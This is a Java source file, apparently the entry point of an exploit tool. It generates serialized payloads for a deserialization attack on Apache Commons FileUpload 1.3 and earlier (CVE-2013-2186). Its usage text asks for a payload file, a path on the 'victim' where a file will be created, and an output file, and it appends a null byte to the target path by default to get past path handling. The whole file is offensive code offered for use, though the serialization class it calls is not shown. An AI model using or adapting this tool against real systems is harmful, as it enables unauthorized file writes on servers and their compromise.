package com.greendog.jser;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

public class Exploit {

	public static void main(String[] args) {
		System.out.println("Payload generator for Java Binary Deserialization attack (ACED)");
		System.out.println("For Apache Commons FileUpload ver <= 1.3 (CVE-2013-2186) ");
		System.out.println("");
		System.out.println("Aleksey 'GreenDog' Tyurin - agrrrdog[at]gmail.com \r\n");

		if (args.length < 3) {
			System.out.println("Usage:");
			System.out.println("java -jar cups.jar /path/payload /path/target /path/out 1 ");
			System.out.println("/path/payload - a path to a file with your payload");
			System.out
					.println("/path/target - a path to a file that will be created in your victim");
			System.out.println("/path/out - a path to a file with serialized payload");

			System.out
					.println("0 - turn off null-byte ending if you attack a patched system (with null by default)");
			System.exit(1);
		}

		String fPathPayload = args[0]; // "D:\\prj\\SerJava\\cup_exploit\\payload.txt";
		String fTarget = args[1];// "D:\\prj\\SerJava\\cup_exploit\\test.txt\0";
		String fPathOut = args[2]; // "D:\\prj\\SerJava\\cup_exploit\\emp1.ser";
		
		if ((args.length < 4) || !(args[3].equals("0"))) {
			System.out.println("with null-byte");
			fTarget = fTarget + "\0";
		}

		StringBuffer payload = new StringBuffer();

		try (BufferedReader br = new BufferedReader(new FileReader(fPathPayload))) {
			payload.append(br.readLine());

			while (br.readLine() != null) {
				payload.append(br.readLine());
			}

		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			System.out.println("Incorrect path to the file with payload: " + e.getMessage());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		try {
			CommUploadSer cus = new CommUploadSer(fTarget, payload.toString());

			cus.Create();

			cus.Serialize(fPathOut);
			System.out.println();
			System.out.println("The payload is created");

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		

	}

}
